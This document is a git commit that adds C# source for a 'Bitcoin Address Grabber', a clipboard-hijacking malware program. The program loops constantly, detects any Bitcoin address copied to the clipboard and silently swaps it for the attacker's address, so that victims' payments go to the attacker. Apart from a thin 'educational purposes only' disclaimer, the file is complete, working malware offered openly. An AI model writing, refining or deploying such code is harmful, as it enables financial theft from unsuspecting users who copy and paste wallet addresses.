adf6b2370f2223b3a018c86a81bc302532df9fa9
NYAN CAT <NYANxCAT@pm.me>
2019-04-21 10:46:15 -0700

    Initial commit

---
+++ Bitcoin-Grabber/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Threading;
+
+//       │ Author     : NYAN CAT
+//       │ Name       : Bitcoin Address Grabber
+//       │ Contact    : https://github.com/NYAN-x-CAT
+
+//       This program is distributed for educational purposes only.
+
+namespace Bitcoin_Grabber
+{
+    class Program
+    {
+        [Obsolete]
+        [STAThread]
+        static void Main()
+        {
+            // the address always start with 1 or 3 or bc1
+            // the length is between 26-35 characters
+            // more info https://en.bitcoin.it/wiki/Address
+            string ADDR = "This should be your bitcoin address";
+
+
+            for (; ; )
+            {
+                if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
+                {
+                    if (Clipboard.GetText().StartsWith("1") ||
+                        Clipboard.GetText().StartsWith("3") ||
+                        Clipboard.GetText().StartsWith("bc1"))
+                    {
+                        new Thread(() =>
+                        {
+                            Clipboard.SetText(ADDR);
+                        })
+                        { ApartmentState = ApartmentState.STA }.Start();
+                    }
+                }
+                Thread.Sleep(10);
+            }
+
+
+        }
+    }
+}
